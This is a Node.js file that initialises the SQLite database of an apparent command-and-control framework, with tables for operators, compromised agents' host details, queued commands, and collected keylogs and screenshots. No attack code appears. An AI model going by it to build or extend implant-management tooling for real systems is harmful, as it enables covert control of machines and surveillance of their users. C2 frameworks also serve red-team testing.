const sqlite3 = require('sqlite3').verbose();
const path = require('path');

// Database file location (single file - easy to backup!)
const dbPath = path.join(__dirname, '../c2_framework.db');

// Create database connection
const db = new sqlite3.Database(dbPath, (err) => {
    if (err) {
        console.error('❌ Database error:', err.message);
    } else {
        console.log('✅ SQLite database connected');
        console.log(`📁 Database file: ${dbPath}`);
    }
});

// Initialize all tables
db.serialize(() => {
    // Users table
    db.run(`
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE NOT NULL,
            password TEXT NOT NULL,
            role TEXT DEFAULT 'operator',
            apiKey TEXT UNIQUE,
            createdAt DATETIME DEFAULT CURRENT_TIMESTAMP,
            lastLogin DATETIME
        )
    `);
    
    // Agents table
    db.run(`
        CREATE TABLE IF NOT EXISTS agents (
            agentId TEXT PRIMARY KEY,
            hostname TEXT NOT NULL,
            username TEXT NOT NULL,
            os TEXT NOT NULL,
            ipAddress TEXT,
            architecture TEXT,
            firstSeen DATETIME DEFAULT CURRENT_TIMESTAMP,
            lastSeen DATETIME DEFAULT CURRENT_TIMESTAMP,
            status TEXT DEFAULT 'active',
            installedModules TEXT DEFAULT '[]',
            tags TEXT DEFAULT '[]',
            note TEXT DEFAULT '',
            systemMetrics TEXT DEFAULT '{}'
        )
    `);
    
    // Tasks table
    db.run(`
        CREATE TABLE IF NOT EXISTS tasks (
            taskId TEXT PRIMARY KEY,
            agentId TEXT NOT NULL,
            type TEXT NOT NULL,
            command TEXT,
            moduleName TEXT,
            moduleAction TEXT,
            moduleParams TEXT,
            status TEXT DEFAULT 'pending',
            result TEXT,
            error TEXT,
            createdAt DATETIME DEFAULT CURRENT_TIMESTAMP,
            completedAt DATETIME,
            FOREIGN KEY (agentId) REFERENCES agents(agentId)
        )
    `);
    
    // Results/Logs table (for keylogs, screenshots, etc.)
    db.run(`
        CREATE TABLE IF NOT EXISTS module_data (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            agentId TEXT NOT NULL,
            moduleName TEXT NOT NULL,
            dataType TEXT NOT NULL,
            data TEXT NOT NULL,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (agentId) REFERENCES agents(agentId)
        )
    `);
    
    console.log('✅ Database tables initialized');
});

module.exports = db;